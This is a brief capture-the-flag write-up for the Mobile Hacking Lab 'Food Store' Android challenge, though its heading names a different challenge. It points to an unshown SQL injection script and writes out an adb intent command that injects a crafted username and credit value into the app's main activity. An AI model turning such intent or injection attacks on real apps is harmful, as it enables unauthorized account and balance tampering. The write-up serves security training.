# Writeup for Guess me challenge.

>here's how to use the scripts only as proof of concept.

Check the full Writeup at my blog --> [Food Store](https://blog.parad0x.vip/blog/2024/08/15/FoodStore.html)
---

## Objective
Exploit the SQL Injection vulnerability, allowing you to register as a Pro user, bypassing standard user restrictions.

## SQL injection

Just run:`./exploit.sh`
Make sure that the android device is connected and the adb is running.

<img width="335" alt="MHL_foodStore_4" src="https://github.com/user-attachments/assets/0b49e2bd-00a5-4447-8caf-d4cac449f93f">


## BONUS INTENT EXPLOIT
The following command will open the app and by sending a crafted deep link

```sh
adb shell am start \
-n com.mobilehackinglab.foodstore/.MainActivity \
--es USERNAME "parad0x" \
--ei USER_CREDIT "1337"
```

<img width="762" alt="MHL_foodStore_5" src="https://github.com/user-attachments/assets/823411e3-2a23-45c8-93e4-4cc3c0265f6d">


## Conclusion

On my blog, I'll cover all the steps, how it's possible to change the value on the screen and exploit a SQLi.
